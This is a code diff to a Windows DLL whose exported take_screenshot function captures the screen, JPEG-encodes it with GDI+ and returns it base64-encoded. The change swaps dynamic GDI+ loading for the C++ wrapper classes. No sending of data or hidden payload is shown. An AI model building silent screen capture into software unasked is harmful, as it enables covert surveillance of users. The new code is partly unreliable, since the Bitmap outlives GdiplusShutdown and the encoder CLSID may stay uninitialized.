@@ -7,6 +7,9 @@
 #include <tlhelp32.h>
 #include <stdio.h>
 #include <string.h>
+#include <stdlib.h>
+#include <objbase.h>
+#include <gdiplus.h>
 
 #pragma comment(lib, "psapi.lib")
 
@@ -217,72 +220,44 @@ extern "C" __declspec(dllexport) int take_screenshot(char* buf, int bufSize) {
     HBITMAP hOld = (HBITMAP)SelectObject(hMem, hBmp);
     BitBlt(hMem, 0, 0, w, h, hScreen, x, y, SRCCOPY);
     SelectObject(hMem, hOld);
+    ReleaseDC(NULL, hScreen);
 
-    // Init GDI+
-    typedef int (WINAPI *GdiplusStartup_t)(ULONG_PTR*, void*, void*);
-    typedef void (WINAPI *GdiplusShutdown_t)(ULONG_PTR);
-    typedef int (WINAPI *GdipCreateBitmapFromHBITMAP_t)(HBITMAP, HPALETTE, void**);
-    typedef int (WINAPI *GdipGetImageEncodersSize_t)(UINT*, UINT*);
-    typedef int (WINAPI *GdipGetImageEncoders_t)(UINT, UINT, void*);
-    typedef int (WINAPI *GdipSaveImageToStream_t)(void*, void*, const wchar_t*, void*);
-    typedef int (WINAPI *GdipCreateStreamOnMemory_t)(BYTE*, int, void**);
-    typedef int (WINAPI *GdipDisposeImage_t)(void*);
-    typedef int (WINAPI *GdipCreateHBITMAPFromBitmap_t)(void*, HBITMAP*, unsigned int);
+    Gdiplus::GdiplusStartupInput input;
+    ULONG_PTR token;
+    Gdiplus::GdiplusStartup(&token, &input, NULL);
 
-    HMODULE hGdip = LoadLibraryW(L"gdiplus.dll");
-    if (!hGdip) { DeleteObject(hBmp); DeleteDC(hMem); ReleaseDC(NULL, hScreen); buf[0] = 0; return -1; }
-
-    auto pStartup = (GdiplusStartup_t)GetProcAddress(hGdip, "GdiplusStartup");
-    auto pShutdown = (GdiplusShutdown_t)GetProcAddress(hGdip, "GdiplusShutdown");
-    auto pCreateBmp = (GdipCreateBitmapFromHBITMAP_t)GetProcAddress(hGdip, "GdipCreateBitmapFromHBITMAP");
-    auto pEncSize = (GdipGetImageEncodersSize_t)GetProcAddress(hGdip, "GdipGetImageEncodersSize");
-    auto pEncoders = (GdipGetImageEncoders_t)GetProcAddress(hGdip, "GdipGetImageEncoders");
-    auto pSave = (GdipSaveImageToStream_t)GetProcAddress(hGdip, "GdipSaveImageToStream");
-    auto pCreateStream = (GdipCreateStreamOnMemory_t)GetProcAddress(hGdip, "GdipCreateStreamOnMemory");
-    auto pDispose = (GdipDisposeImage_t)GetProcAddress(hGdip, "GdipDisposeImage");
-
-    ULONG_PTR gdiplusToken;
-    char startupBuf[24] = {0};
-    pStartup(&gdiplusToken, startupBuf, NULL);
-
-    void* pGdipBmp = NULL;
-    pCreateBmp(hBmp, NULL, &pGdipBmp);
-
-    // Find JPEG encoder
+    Gdiplus::Bitmap bmp(hBmp, NULL);
+    CLSID jpegClsid;
     UINT num = 0, size = 0;
-    pEncSize(&num, &size);
-    void* encoders = malloc(size);
-    pEncoders(num, size, encoders);
-    CLSID jpegClsid = {0};
+    Gdiplus::GetImageEncodersSize(&num, &size);
+    Gdiplus::ImageCodecInfo* pEncoders = (Gdiplus::ImageCodecInfo*)malloc(size);
+    Gdiplus::GetImageEncoders(num, size, pEncoders);
     for (UINT i = 0; i < num; i++) {
-        wchar_t* mime = (wchar_t*)((BYTE*)encoders + i * (76 + 48*2) + 48);
-        if (wcsstr(mime, L"image/jpeg")) {
-            memcpy(&jpegClsid, (BYTE*)encoders + i * (76 + 48*2), 16);
+        if (wcscmp(pEncoders[i].MimeType, L"image/jpeg") == 0) {
+            jpegClsid = pEncoders[i].Clsid;
             break;
         }
     }
-    free(encoders);
+    free(pEncoders);
 
-    // Save to IStream in memory
-    void* pStream = NULL;
-    pCreateStream(NULL, 0, &pStream);
-    int quality = 60;
-    // Encoder parameter: quality
-    struct { GUID Guid; ULONG NumberOfValues; ULONG Type; void* Value; } param;
-    GUID qualityParam = {0x1d5be4b5, 0xfa4a, 0x452d, {0x9c,0xdd,0x5a,0x38,0x29,0x41,0x93,0x25}};
-    param.Guid = qualityParam; param.NumberOfValues = 1; param.Type = 1; param.Value = &quality;
-    pSave(pGdipBmp, pStream, L"image/jpeg", &param);
+    IStream* pStream = NULL;
+    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
+    Gdiplus::EncoderParameters eps;
+    eps.Count = 1;
+    eps.Parameter[0].Guid = Gdiplus::EncoderQuality;
+    eps.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
+    eps.Parameter[0].NumberOfValues = 1;
+    ULONG quality = 60;
+    eps.Parameter[0].Value = &quality;
+    bmp.Save(pStream, &jpegClsid, &eps);
 
-    // Read from IStream
     STATSTG stat;
-    pStream->lpVtbl->Stat(pStream, &stat, 1);
+    pStream->Stat(&stat, 1);
     ULONG len = (ULONG)stat.cbSize.QuadPart;
     if (len > 0 && len < (ULONG)(bufSize - 8)) {
-        IStream* pSeek = pStream;
         LARGE_INTEGER zero = {0};
-        pSeek->lpVtbl->Seek(pSeek, zero, STREAM_SEEK_SET, NULL);
-        ULONG read = 0;
-        pSeek->lpVtbl->Read(pSeek, (void*)buf, len, &read);
+        pStream->Seek(zero, STREAM_SEEK_SET, NULL);
+        pStream->Read((void*)buf, len, &len);
         // Base64 encode
         const char* tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
         int o = 0;
@@ -300,10 +275,8 @@ extern "C" __declspec(dllexport) int take_screenshot(char* buf, int bufSize) {
         buf[0] = 0; len = 0;
     }
 
-    pStream->lpVtbl->Release(pStream);
-    pDispose(pGdipBmp);
-    pShutdown(gdiplusToken);
-    FreeLibrary(hGdip);
-    DeleteObject(hBmp); DeleteDC(hMem); ReleaseDC(NULL, hScreen);
+    pStream->Release();
+    Gdiplus::GdiplusShutdown(token);
+    DeleteObject(hBmp); DeleteDC(hMem);
     return (len > 0) ? 0 : -1;
 }
